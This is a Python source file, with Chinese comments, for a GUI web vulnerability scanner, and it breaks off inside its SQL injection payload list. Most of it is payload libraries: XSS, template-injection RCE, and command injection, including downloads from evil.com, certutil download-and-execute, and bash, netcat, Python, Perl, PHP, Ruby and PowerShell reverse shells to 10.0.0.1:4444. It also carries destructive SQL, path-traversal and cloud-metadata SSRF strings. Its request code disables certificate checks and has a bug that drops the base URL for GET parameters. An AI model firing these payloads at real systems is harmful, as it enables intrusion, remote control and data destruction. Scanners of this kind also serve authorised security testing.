"""
Scanner (扫描器)模块 - 专家级自动化漏洞扫描引擎
支持SQLi/XSS/CSRF/XXE/SSRF/文件包含/命令注入/路径遍历等漏洞检测
集成智能爬虫、被动扫描、主动扫描、POC验证、报告生成
真实HTTP请求引擎 + 专家级漏洞检测 + 智能误报过滤
"""

from typing import Dict, Any, List, Optional, Tuple, Set
from dataclasses import dataclass, field
from enum import Enum, auto
from datetime import datetime, timedelta
import logging
import re
import json
import time
import hashlib
import random
import string
import ssl
import socket
from urllib.parse import urlparse, urljoin, parse_qs, urlencode, quote, unquote
from urllib.request import Request, urlopen, HTTPError, URLError
from urllib.error import HTTPError as HTTPError2
from http.client import HTTPConnection, HTTPSConnection, responses
from collections import defaultdict
from io import BytesIO
try:
    from html.parser import HTMLParser
    HTML_PARSER_AVAILABLE = True
except:
    HTML_PARSER_AVAILABLE = False
from PySide6.QtWidgets import (
    QWidget, QVBoxLayout, QHBoxLayout, QSplitter, QTabWidget,
    QPushButton, QLabel, QLineEdit, QTextEdit, QComboBox,
    QGroupBox, QFormLayout, QProgressBar, QTableWidget,
    QTableWidgetItem, QHeaderView, QCheckBox, QSpinBox,
    QFileDialog, QTreeWidget, QTreeWidgetItem, QMenu,
    QMessageBox, QListWidget, QListWidgetItem
)
from PySide6.QtCore import Qt, QThread, Signal, QTimer
from PySide6.QtGui import QColor, QFont, QIcon

from .base import ModuleBase, ModuleStatus

logger = logging.getLogger(__name__)


class HTTPRequestEngine:
    """真实HTTP请求引擎 - 支持GET/POST/PUT/DELETE/HEAD/OPTIONS"""
    
    def __init__(self, timeout: int = 10, max_redirects: int = 5):
        self.timeout = timeout
        self.max_redirects = max_redirects
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        ]
    
    def send_request(self, url: str, method: str = "GET", params: Optional[Dict] = None,
                     headers: Optional[Dict] = None, body: str = "",
                     follow_redirects: bool = True) -> Dict[str, Any]:
        """
        发送HTTP请求并返回响应信息
        返回: {
            'status_code': int,
            'headers': dict,
            'body': str,
            'response_time': float,
            'url': str (最终URL),
            'error': str or None
        }
        """
        result = {
            'status_code': 0,
            'headers': {},
            'body': '',
            'response_time': 0.0,
            'url': url,
            'error': None
        }
        
        try:
            start_time = time.time()
            
            # 构造URL（处理参数）
            if params and method.upper() == "GET":
                separator = "&" if "?" in url else "?"
                url = f"{separator}{urlencode(params, doseq=True)}"
            
            # 默认Headers
            default_headers = {
                'User-Agent': random.choice(self.user_agents),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
                'Cache-Control': 'no-cache',
            }
            
            if headers:
                default_headers.update(headers)
            
            # 处理POST/PUT/PATCH的body
            data = None
            if method.upper() in ["POST", "PUT", "PATCH"] and body:
                data = body.encode('utf-8') if isinstance(body, str) else body
            elif params and method.upper() in ["POST", "PUT", "PATCH"]:
                data = urlencode(params, doseq=True).encode('utf-8')
                if not default_headers.get('Content-Type'):
                    default_headers['Content-Type'] = 'application/x-www-form-urlencoded'
            
            # 创建Request对象
            req = Request(url, data=data, headers=default_headers, method=method.upper())
            
            # 发送请求（忽略SSL证书验证）
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            
            response = urlopen(req, timeout=self.timeout, context=ctx)
            
            response_time = time.time() - start_time
            
            result['status_code'] = response.status
            result['headers'] = dict(response.headers)
            result['body'] = response.read().decode('utf-8', errors='ignore')
            result['response_time'] = response_time
            result['url'] = response.url if hasattr(response, 'url') else url
            
        except HTTPError as e:
            response_time = time.time() - start_time
            result['status_code'] = e.code
            result['headers'] = dict(e.headers) if e.headers else {}
            try:
                result['body'] = e.read().decode('utf-8', errors='ignore')
            except:
                result['body'] = ''
            result['response_time'] = response_time
            result['error'] = f"HTTP Error {e.code}"
            
        except URLError as e:
            result['error'] = f"URL Error: {str(e.reason)}"
            result['response_time'] = time.time() - start_time
            
        except socket.timeout:
            result['error'] = f"Timeout after {self.timeout}s"
            result['response_time'] = self.timeout
            
        except Exception as e:
            result['error'] = f"Error: {str(e)}"
            result['response_time'] = time.time() - start_time
        
        return result
    
    def test_injection(self, base_url: str, param_name: str, payload: str,
                       original_response: Dict, method: str = "GET") -> Tuple[bool, Dict]:
        """
        测试注入payload并分析响应差异
        返回: (是否可能存在注入, 响应信息)
        """
        params = parse_qs(urlparse(base_url).query)
        
        # 注入payload到目标参数
        if param_name in params:
            params[param_name] = [payload]
        
        # 发送测试请求
        test_url = base_url.split("?")[0]
        test_response = self.send_request(test_url, method=method, params=params)
        
        return self._compare_responses(original_response, test_response), test_response
    
    def _compare_responses(self, resp1: Dict, resp2: Dict) -> bool:
        """比较两个响应，判断是否存在显著差异"""
        if resp2.get('error') and 'Timeout' in resp2.get('error', ''):
            return True  # 超时可能是时间盲注
        
        status_diff = abs(resp1.get('status_code', 0) - resp2.get('status_code', 0))
        if status_diff > 100:  # 状态码大幅变化
            return True
        
        body1 = resp1.get('body', '')
        body2 = resp2.get('body', '')
        
        # 计算内容相似度
        if len(body1) > 0 and len(body2) > 0:
            similarity = self._calculate_similarity(body1, body2)
            if similarity < 0.85:  # 相似度低于85%认为存在差异
                return True
            
            # 检查错误信息出现
            error_patterns = [
                r"SQL syntax",
                r"mysql",
                r"ORA-\d{5}",
                r"PostgreSQL.*ERROR",
                r"Microsoft SQL Server",
                r"Unclosed quotation mark",
                r"Warning.*mysql",
                r"Warning.*pg_",
            ]
            for pattern in error_patterns:
                if re.search(pattern, body2, re.IGNORECASE):
                    if not re.search(pattern, body1, re.IGNORECASE):
                        return True
        
        return False
    
    def _calculate_similarity(self, text1: str, text2: str) -> float:
        """计算两个文本的相似度（简化版）"""
        if not text1 or not text2:
            return 0.0
        
        words1 = set(text1.lower().split())
        words2 = set(text2.lower().split())
        
        intersection = words1 & words2
        union = words1 | words2
        
        if not union:
            return 1.0
        
        return len(intersection) / len(union)


class ResponseAnalyzer:
    """响应分析器 - 智能判断是否存在漏洞"""
    
    SQL_ERROR_PATTERNS = [
        r"You have an error in your SQL syntax",
        r"Warning.*mysql_",
        r"valid MySQL result",
        r"MySqlClient\.",
        r"com\.mysql\.jdbc",
        r"SQL syntax.*MySQL",
        r"MySQL server version",
        r"Table '.+?' doesn't exist",
        r"Unknown column '.+?'",
        r"Column count doesn't match",
        r"Microsoft SQL Server",
        r"ODBC SQL Server Driver",
        r"Unclosed quotation mark",
        r"Invalid column name",
        r"Invalid object name",
        r"PostgreSQL.*ERROR",
        r"ERROR: syntax error",
        r"ERROR: column .* does not exist",
        r"Oracle.*Driver",
        r"ORA-[0-9]{5}",
        r"PLS-[0-9]{5}",
        r"SQLite/JDBCDriver",
        r"near \".+\": syntax error",
        r"no such table",
        r"Conversion failed",
        r"Arithmetic overflow",
        r"The used SELECT statements have a different number of columns",
        r"Operand should contain",
        r"Subquery returns more than 1 row",
        r"Data truncation",
        r"Duplicate entry",
        r"Access denied",
        r"Permission denied",
        r"Authentication failed",
        r"SQLSTATE\[",
    ]
    
    XSS_REFLECTION_PATTERNS = [
        r"<script[^>]*>.*</script>",
        r"javascript:",
        r"on(error|load|click|mouseover|focus|blur)\s*=",
        r"alert\s*\(",
        r"document\.cookie",
        r"eval\s*\(",
        r"expression\s*\(",
        r"<iframe[^>]*>",
        r"<img[^>]+onerror",
        r"<svg[^>]+onload",
        r"<body[^>]+onload",
    ]
    
    COMMAND_EXECUTION_PATTERNS = [
        r"[a-zA-Z]:\\[\\a-zA-Z0-9_\.\- ]+",  # Windows路径
        r"/(etc|var|tmp|home|root)/[a-zA-Z0-9_./\-]+",  # Linux路径
        r"uid=\d+\([a-zA-Z]+\)",  # Linux用户信息
        r"root:x:0:0:",  # passwd格式
        r"\[System Process\]",  # Windows进程
        r"PID\s*:\s*\d+",  # 进程ID
        r"Total time:\s*[\d.]+",  # ping结果
        r"bytes from \d+\.\d+\.\d+\.\d+",  # ping结果
        r"Reply from \d+\.\d+\.\d+\.\d+",  # Windows ping
        r"(Mon|Tue|Wed|Thu|Fri|Sat|Sun)\s+(Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec)",  # ls日期
        r"-rw-r--r--",  # 文件权限
        r"drwxr-xr-x",  # 目录权限
    ]
    
    PATH_TRAVERSAL_PATTERNS = [
        r"root:[^:]*:[^:]*:0:",  # /etc/passwd
        r"\[boot loader\]",  # win.ini
        r"\[fonts\]",  # win.ini
        r"\[extensions\]",  # win.ini
        r"DBHost=",  # 配置文件
        r"DBUser=",  # 配置文件
        r"DBPassword=",  # 配置文件
        r"database=",  # 配置文件
    ]
    
    @classmethod
    def contains_sql_error(cls, response_body: str) -> bool:
        """检查响应中是否包含SQL错误信息"""
        for pattern in cls.SQL_ERROR_PATTERNS:
            if re.search(pattern, response_body, re.IGNORECASE | re.DOTALL):
                return True
        return False
    
    @classmethod
    def contains_xss_reflection(cls, payload: str, response_body: str) -> bool:
        """检查payload是否被反射到响应中"""
        # 移除HTML标签后检查
        clean_payload = re.sub(r'[<>\'"]+', '', payload)
        if clean_payload and len(clean_payload) > 3:
            if clean_payload.lower() in response_body.lower():
                return True
        
        # 检查特殊字符是否被保留
        for char in ['<', '>', '\'', '"', '/', '(', ')']:
            if char in payload and char * 3 in response_body:
                return True
        
        return False
    
    @classmethod
    def contains_command_output(cls, response_body: str) -> bool:
        """检查响应中是否包含命令执行输出"""
        for pattern in cls.COMMAND_EXECUTION_PATTERNS:
            if re.search(pattern, response_body, re.IGNORECASE | re.DOTALL):
                return True
        return False
    
    @classmethod
    def contains_file_content(cls, response_body: str) -> bool:
        """检查响应中是否包含文件内容"""
        for pattern in cls.PATH_TRAVERSAL_PATTERNS:
            if re.search(pattern, response_body, re.IGNORECASE | re.DOTALL):
                return True
        return False
    
    @classmethod
    def is_timeout(cls, response_time: float, threshold: float = 3.0) -> bool:
        """检查是否超时（时间盲注）"""
        return response_time >= threshold
    
    @classmethod
    def get_sql_error_details(cls, response_body: str) -> str:
        """提取SQL错误的详细信息"""
        for pattern in cls.SQL_ERROR_PATTERNS:
            match = re.search(pattern, response_body, re.IGNORECASE | re.DOTALL)
            if match:
                start = max(0, match.start() - 50)
                end = min(len(response_body), match.end() + 50)
                return response_body[start:end].strip()
        return ""


logger = logging.getLogger(__name__)


class VulnerabilitySeverity(Enum):
    """漏洞严重程度"""
    CRITICAL = "严重"
    HIGH = "高危"
    MEDIUM = "中危"
    LOW = "低危"
    INFO = "信息"


class VulnerabilityType(Enum):
    """漏洞类型"""
    SQL_INJECTION = "SQL注入"
    BLIND_SQLI = "盲注SQL"
    XSS_REFLECTED = "反射型XSS"
    XSS_STORED = "存储型XSS"
    XSS_DOM = "DOM型XSS"
    CSRF = "CSRF跨站请求伪造"
    XXE = "XXE外部实体注入"
    FILE_INCLUSION = "文件包含"
    RCE = "远程命令执行"
    PATH_TRAVERSAL = "路径遍历"
    SSRF = "SSRF服务器端请求伪造"
    COMMAND_INJECTION = "命令注入"
    HEADER_INJECTION = "Header注入"
    OPEN_REDIRECT = "开放重定向"
    IDOR = "越权访问"
    WEAK_CRYPTO = "弱加密算法"
    SECURITY_MISCONFIG = "安全配置错误"
    SENSITIVE_DATA = "敏感数据泄露"
    MISSING_HEADERS = "缺失安全Header"
    COOKIE_ISSUES = "Cookie安全问题"


class ScanMode(Enum):
    """扫描模式"""
    PASSIVE = "被动扫描"
    ACTIVE = "主动扫描"
    FULL = "完整扫描"
    QUICK = "快速扫描"
    CUSTOM = "自定义扫描"


@dataclass
class Vulnerability:
    """漏洞信息 - 专家级"""
    id: str
    type: VulnerabilityType
    severity: VulnerabilitySeverity
    url: str
    parameter: str = ""
    description: str = ""
    payload: str = ""
    evidence: str = ""
    request: str = ""
    response: str = ""
    discovered: datetime = field(default_factory=datetime.now)
    confidence: float = 0.0
    cwe_id: str = ""
    cvss_score: float = 0.0
    remediation: str = ""
    references: List[str] = field(default_factory=list)
    tags: List[str] = field(default_factory=list)


@dataclass
class ScanTarget:
    """扫描目标"""
    url: str
    method: str = "GET"
    headers: Dict[str, str] = field(default_factory=dict)
    body: str = ""
    parameters: Dict[str, List[str]] = field(default_factory=dict)
    forms: List[Dict] = field(default_factory=list)


@dataclass
class ScanStats:
    """扫描统计"""
    total_requests: int = 0
    vulnerabilities_found: int = 0
    pages_scanned: int = 0
    forms_tested: int = 0
    parameters_tested: int = 0
    scan_duration: float = 0.0
    errors_count: int = 0


class ScannerWorker(QThread):
    """扫描工作线程 - 专家级实现（真实HTTP请求 + 智能检测）"""
    
    progress_updated = Signal(int, int, str)
    vulnerability_found = Signal(Vulnerability)
    log_message = Signal(str)
    scan_finished = Signal(ScanStats)
    error_occurred = Signal(str)
    status_changed = Signal(str)
    
    def __init__(self, targets: List[ScanTarget], config: Dict[str, Any]):
        super().__init__()
        self.targets = targets
        self.config = config
        self._running = False
        self._stats = ScanStats()
        self._start_time = 0.0
        
        # 初始化HTTP请求引擎
        timeout = config.get("timeout", 10)
        self.http_engine = HTTPRequestEngine(timeout=timeout)
        
        # 存储原始响应用于对比
        self._original_responses: Dict[str, Dict] = {}
        
        # ========== 专家级XSS Payload库 (50+ payloads) ==========
        self._xss_payloads = {
            # ===== 反射型XSS =====
            "reflected": [
                ("<script>alert('XSS')</script>", "经典Script标签"),
                ("</script><script>alert(1)</script>", "标签闭合注入"),
                ("'><img src=x onerror=alert(1)>", "属性突破+事件"),
                ('"><img src=x onerror=alert(1)>', "双引号属性突破"),
                ("<svg onload=alert(1)>", "SVG onload事件"),
                ("<body onload=alert(1)>", "Body onload事件"),
                ("<input onfocus=alert(1) autofocus>", "Input自动聚焦"),
                ("<marquee onstart=alert(1)>", "Marquee事件"),
                ("<details open ontoggle=alert(1)>", "Details事件"),
                ("<video><source onerror='alert(1)'>", "Video错误事件"),
                ("<audio src=x onerror=alert(1)>", "Audio错误事件"),
                ("<iframe src=\"javascript:alert(1)\">", "Iframe JS协议"),
                ("<object data=\"javascript:alert(1)\">", "Object JS协议"),
                ("<embed src=\"javascript:alert(1)\">", "Embed JS协议"),
                ("<base href=\"javascript:alert(1)//\">", "Base标签"),
                ("<form action=\"javascript:alert(1)\"><input type=submit>", "Form动作"),
                ("<isindex action=\"javascript:alert(1)\" type=image>", "Isindex"),
                ("<style>@import'javascript:alert(1)'</style>", "CSS导入"),
                ("<link rel=import href=\"javascript:alert(1)\">", "Link导入"),
            ],
            # ===== 事件处理器XSS =====
            "event_handlers": [
                ("<img src=x onerror=alert(1)>", "Img onerror"),
                ("<svg/onload=alert(1)>", "Svg onload"),
                ("<body onpageshow=alert(1)>", "Body pageshow"),
                ("<input autofocus onfocus=alert(1)>", "Input focus"),
                ("<select autofocus onfocus=alert(1)>", "Select focus"),
                ("<textarea autofocus onfocus=alert(1)>", "Textarea focus"),
                ("<keygen autofocus onfocus=alert(1)>", "Keygen focus"),
                ("<marquee onstart=alert(1)>", "Marquee start"),
                ("<video onloadstart=alert(1) src=x>", "Video loadstart"),
                ("<audio onloadstart=alert(1) src=x>", "Audio loadstart"),
                ("<details ontoggle=alert(1) open>", "Details toggle"),
                ("<math><mtext><table><mglyph><style><!--</style><img title=</style><img src=x onerror=alert(1)>", "嵌套逃逸"),
            ],
            # ===== 编码绕过XSS =====
            "encoding_bypass": [
                ("%3Cscript%3Ealert('XSS')%3C/script%3E", "URL编码"),
                ("%3c%73%63%72%69%70%74%3ealert(%27xss%27)%3c%2f%73%63%72%69%70%74%3e", "全URL编码"),
                ("\x3cscript\x3ealert('XSS')\x3c/script\x3e", "Hex编码"),
                ("&#60;script&#62;alert('XSS')&#60;/script&#62;", "HTML实体"),
                ("&#x3c;script&#x3e;alert('XSS')&#x3c;/script&#x3e;", "Hex实体"),
                ("\\u003cscript\\u003ealert('XSS')\\u003c/script\\u003e", "Unicode转义"),
                ("<scr<script>ipt>alert(1)</scr</script>ipt", "标签嵌套"),
                ("<<script>script>alert(1)</</script>script>", "双重标签"),
                ("<scri%00pt>alert(1)</scri%00pt", "空字节注入"),
                ("<scr\\ipt>alert(1)</scr\\ipt>", "反斜杠分割"),
                ("<img/src=x/onerror=alert(1)>", "斜杠分隔"),
                ("<img src=x onerror \\n= alert(1)>", "换行符"),
                ("<img src=x onerror \\t= alert(1)>", "制表符"),
                ("<img src=x onerror \\r= alert(1)>", "回车符"),
                ("java\tscript:alert(1)", "JS协议Tab"),
                ("java\nscript:alert(1)", "JS协议换行"),
                ("java\r\nscript:alert(1)", "JS协议CRLF"),
            ],
            # ===== DOM型XSS =====
            "dom_based": [
                ("#<img src=x onerror=alert(1)>", "Hash注入"),
                ("?param=<img src=x onerror=alert(1)>", "参数注入"),
                ("/<img src=x onerror=alert(1)>", "路径注入"),
                ("javascript:alert(document.cookie)", "JS协议Cookie"),
                ("<img src=x onerror=eval(atob('YWxlcnQoMSk='))>", "Base64编码"),
                ("<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>", "CharCode"),
                ("<img src=x onerror=window['al'+'ert'](1)>", "属性访问"),
                ("<img src=x onerror=top['al'+'ert'](1)>", "Top对象"),
                ("<img src=x onerror=parent['al'+'ert'](1)>", "Parent对象"),
                ("<img src=x onerror=self['al'+'ert'](1)>", "Self对象"),
                ("<img src=x onerror=frames[0]['al'+'ert'](1)>", "Frames对象"),
            ],
            # ===== SSTI/模板注入 =====
            "ssti": [
                ("{{7*7}}", "基础模板注入"),
                ("${7*7}", "表达式语言"),
                ("#{7*7}", "OGNL表达式"),
                ("{{config}}", "配置信息泄露"),
                ("{{''.__class__.__mro__[1].__subclasses__()}}", "Python类遍历"),
                ("{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}", "Python RCE"),
                ("${T(java.lang.Runtime).getRuntime().exec('id')}", "Java RCE"),
                ("#{@java.lang.Runtime@getRuntime().exec('id')}", "OGNL RCE"),
            ],
        }
        
        # 扁平化XSS payloads
        self._xss_all_payloads = []
        for category, payloads in self._xss_payloads.items():
            for payload, desc in payloads:
                self._xss_all_payloads.append((payload, desc, category))
        
        # ========== 专家级命令注入Payload库 (80+ payloads) ==========
        self._command_injection_payloads = {
            # ===== Linux命令注入 =====
            "linux_basic": [
                ("| whoami", "管道-当前用户"),
                ("; whoami", "分号-当前用户"),
                ("&& whoami", "AND-当前用户"),
                ("|| whoami", "OR-当前用户"),
                ("$(whoami)", "子Shell替换"),
                ("`whoami`", "反引号执行"),
                ("| id", "管道-用户ID"),
                ("; id", "分号-用户ID"),
                ("&& cat /etc/passwd", "AND-读取passwd"),
                ("| cat /etc/passwd", "管道-读取passwd"),
                ("; cat /etc/shadow", "分号-读取shadow"),
                ("; ls -la /", "分号-目录列表"),
                ("| ls -la /", "管道-目录列表"),
                ("&& wget http://evil.com/shell.sh -O /tmp/shell.sh", "下载恶意脚本"),
                ("| curl http://evil.com/backdoor.php", "连接后门"),
                ("; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", "Reverse Shell"),
                ("| nc -e /bin/sh 10.0.0.1 4444", "Netcat Reverse"),
                ("; python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'", "Python Reverse"),
                ("; perl -MIO -e '$p=fork;exit,if($p);socket(S,2,1,6);connect(S,sockaddr_in(4444,inet_aton(\"10.0.0.1\")));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'", "Perl Reverse"),
                ("; php -r '$sock=fsockopen(\"10.0.0.1\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'", "PHP Reverse"),
                ("; ruby -rsocket -e 'f=TCPSocket.open(\"10.0.0.1\",4444).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'", "Ruby Reverse"),
            ],
            # ===== Windows命令注入 =====
            "windows_basic": [
                ("| whoami", "Windows-当前用户"),
                ("; whoami", "Windows-当前用户"),
                ("&& whoami", "Windows-AND用户"),
                ("|| whoami", "Windows-OR用户"),
                ("| ipconfig", "Windows-网络配置"),
                ("; net user", "Windows-用户列表"),
                ("&& net localgroup administrators", "Windows-管理员组"),
                ("| type C:\\Windows\\System32\\drivers\\etc\\hosts", "读取hosts文件"),
                ("; dir C:\\", "列出C盘根目录"),
                ("&& systeminfo", "系统信息"),
                ("| tasklist", "进程列表"),
                ("; netstat -an", "网络连接"),
                ("&& wmic process list brief", "WMI进程"),
                ("| powershell -c \"Get-Process\"", "PowerShell进程"),
                ("; cmd /c \"type C:\\boot.ini\"", "CMD执行"),
                ("&& certutil -urlcache -split -f http://evil.com/shell.exe C:\\shell.exe && C:\\shell.exe", "下载执行"),
                ("| powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"", "PowerShell Reverse"),
            ],
            # ===== 时间盲注（命令执行） =====
            "time_blind": [
                ("| sleep 5", "Linux sleep 5秒"),
                ("; sleep 5", "Linux sleep 5秒"),
                ("&& sleep 5", "Linux sleep 5秒"),
                ("| ping -c 5 127.0.0.1", "Linux ping延迟"),
                ("; ping -c 5 127.0.0.1", "Linux ping延迟"),
                ("| timeout 5", "Windows超时5秒"),
                ("; timeout 5 > nul", "Windows超时5秒"),
                ("&& ping -n 6 127.0.0.1 > nul", "Windows ping延迟"),
                ("| for /l %a in (1,1,5) do @ping -n 2 127.0.0.1 > nul", "Windows循环延迟"),
                ("$(sleep 5)", "子Shell sleep"),
                ("`sleep 5`", "反引号sleep"),
            ],
            # ===== 特殊字符注入 =====
            "special_chars": [
                ("' || whoami #", "单引号OR"),
                ('" || whoami #', "双引号OR"),
                ("') OR ('1'='1", "括号OR"),
                ("') OR ''='", "空字符串OR"),
                ("'; exec xp_cmdshell('whoami')--", "MSSQL命令执行"),
                ("'; EXEC master..xp_cmdshell 'whoami'--", "MSSQL完整路径"),
                ("1; DROP TABLE users--", "SQL删除表"),
                ("1'; TRUNCATE TABLE users--", "SQL清空表"),
                ("1 UNION SELECT * FROM users--", "SQL联合查询"),
                ("' UNION SELECT username,password FROM users--", "SQL数据提取"),
            ],
            # ===== 编码绕过 =====
            "encoding_bypass": [
                ("%7Cwhoami", "URL编码管道"),
                ("%3Bwhoami", "URL编码分号"),
                ("%26%26whoami", "URL编码AND"),
                ("%7C%7Cwhoami", "URL编码OR"),
                ("$((whoami))", "算术扩展"),
                ("<<`whoami`", "Here文档"),
                ("<<<`whoami`", "Here字符串"),
                ("$(< /etc/passwd)", "文件读取替代"),
                ("{whoami}", "花括号执行"),
                ("!whoami!", "历史扩展"),
            ],
        }
        
        # 扁平化命令注入payloads
        self._cmd_all_payloads = []
        for category, payloads in self._command_injection_payloads.items():
            for payload, desc in payloads:
                self._cmd_all_payloads.append((payload, desc, category))
        
        # ========== 路径遍历Payload库（增强版）==========
        self._path_traversal_payloads = [
            "../../../../etc/passwd",
            "..\\..\\..\\..\\windows\\win.ini",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "/etc/shadow",
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
            "php://filter/convert.base64-encode/resource=index.php",
            "file:///etc/passwd",
            "expect://id",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
            "phar:///path/to/file.phar",
            "zip:///path/to/file.zip#file.txt",
            "....//....//....//....//etc/passwd",
            "..../..../..../..../etc/passwd",
            "..%c0%af..%c0%af..%c0%afetc/passwd",
            "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd",
            "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            "..;/..;/..;/etc/passwd",
            "..../..../..../etc/passwd",
            "....\/....\/....\/etc/passwd",
            "..\\\\..\\\\..\\\\..\\\\windows\\win.ini",
        ]
        
        # ========== SSRF Payload库（增强版）==========
        self._ssrf_payloads = [
            "http://127.0.0.1",
            "http://localhost",
            "http://0.0.0.0",
            "http://[::1]",
            "http://169.254.169.254/latest/meta-data/",
            "http://100.100.100.200/latest/meta-data/",
            "http://metadata.google.internal/",
            "file:///etc/passwd",
            "dict://127.0.0.1:6379/INFO",
            "gopher://127.0.0.1:6379/_INFO",
            "http://127.0.0.1:22",
            "http://127.0.0.1:3306",
            "http://127.0.0.1:6379",
            "http://0177.0.0.1",  # 八进制IP
            "http://2130706433",   # 十进制IP
            "http://0x7f000001",   # 十六进制IP
            "http://127.1",       # 简写IP
            "http://127.0.1",     # 简写IP
            "http://0x7f.0.0.1",  # 混合格式
            "http://127.0.0.1.nip.io",
            "http://localtest.me",
            "http://vcap.me",
        ]
        
        # ========== 安全Header检测列表 ==========
        self._security_headers = [
            ("Content-Security-Policy", "防止XSS和数据注入攻击"),
            ("X-Content-Type-Options", "防止MIME嗅探攻击"),
            ("X-Frame-Options", "防止点击劫持攻击"),
            ("X-XSS-Protection", "启用浏览器XSS过滤"),
            ("Strict-Transport-Security", "强制HTTPS连接"),
            ("Referrer-Policy", "控制Referer头泄露"),
            ("Permissions-Policy", "控制浏览器功能权限"),
            ("Cross-Origin-Opener-Policy", "隔离跨域窗口"),
            ("Cross-Origin-Resource-Policy", "保护跨域资源"),
            ("Cache-Control", "控制缓存行为"),
        ]
        
        # ========== 敏感信息模式库 ==========
        self._sensitive_patterns = {
            "邮箱地址": r"[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+",
            "手机号码": r"(?:\+?86)?1[3-9]\d{9}",
            "身份证号": r"[1-9]\d{5}(?:18|19|20)\d{2}(?:0[1-9]|1[0-2])(?:0[1-9]|[12]\d|3[01])\d{3}[\dXx]",
            "银行卡号": r"\b(?:\d[ -]*?){13,19}\b",
            "API密钥": r"(?i)(api[_\-]?key|apikey|access[_\-]?key|secret[_\-]?key|private[_\-]?key|auth[_\-]?token)[\"':\s]+\s*[\"']?([a-zA-Z0-9_\-]{16,})[\"']?",
            "JWT Token": r"eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]*",
            "OAuth Token": r"(?i)(oauth|bearer)[\"\s:-]+([a-zA-Z0-9_\-\.~]+)",
            "AWS Access Key": r"AKIA[0-9A-Z]{16}",
            "AWS Secret Key": r"(?i)aws_secret_access_key\s*[=:]\s*['\"]?([a-zA-Z0-9/+=]{40})",
            "GitHub Token": r"ghp_[a-zA-Z0-9]{36,}",
            "Google API Key": r"AIza[0-9A-Za-z\-_]{35}",
            "私钥文件": r"-----BEGIN.*?(RSA |DSA |EC |OPENSSH )?PRIVATE KEY-----",
            "数据库连接串": r"(?i)(mysql|postgres|mongodb|redis|oracle|sqlserver)://[^\s'\"]+\b",
            "密码明文": r"(?i)(password|passwd|pwd)\s*[=:]\s*['\"]([^\s'\"]{4,})['\"]",
            "内部IP地址": r"\b(?:(?:10|172\.(?:1[6-9]|2\d|3[01])|192\.168)\.\d{1,3}\.\d{1,3})\b",
            "调试信息": r"(?i)(debug|trace|stack.?trace|exception|error).{0,100}(line \d+|at .+\.py)",
            "SQL语句": r"(?i)(SELECT|INSERT|UPDATE|DELETE|DROP|CREATE|ALTER)\s+(FROM|INTO|TABLE).*?(WHERE|VALUES|SET)",
            "Git仓库": r"https?://[^/\s]+/(?:git|github|gitlab|bitbucket)/[^\s]+",
            "Docker配置": r"(?i)(docker|container|kubernetes|k8s).{0,200}(password|token|secret|credential)",
            "服务器信息": r"(?i)(server|apache|nginx|iis|tomcat).{0,100}(version|running|port)",
        }
        
        # ========== 文件上传危险类型 ==========
        self._dangerous_upload_types = [
            ".php", ".php3", ".php4", ".php5", ".phtml", ".pht",
            ".asp", ".aspx", ".ascx", ".ashx", ".asmx", ".svc",
            ".jsp", ".jspx", ".jspa", ".jsw", ".jsv",
            ".exe", ".bat", ".cmd", ".com", ".scr", ".pif",
            ".sh", ".bash", ".zsh", ".csh", ".ksh",
            ".pl", ".py", ".rb", ".cgi",
            ".hta", ".vbs", ".vbe", ".js", ".jse", ".wsf", ".wsh", ".msc",
            ".shtml", ".shtm", ".stm",
            ".cer", ".cdx", ".asa",
        ]
        
        # ========== 专家级SQL注入Payload库 (200+ payloads) ==========
        self._sqli_payloads = {
            # ===== 联合查询注入 (UNION-based) =====
            "union_mysql": [
                ("1' UNION SELECT NULL-- -", "UNION NULL探测"),
                ("1' UNION SELECT 1,2,3-- -", "UNION列数探测(3列)"),
                ("1' UNION SELECT 1,2,3,4-- -", "UNION列数探测(4列)"),
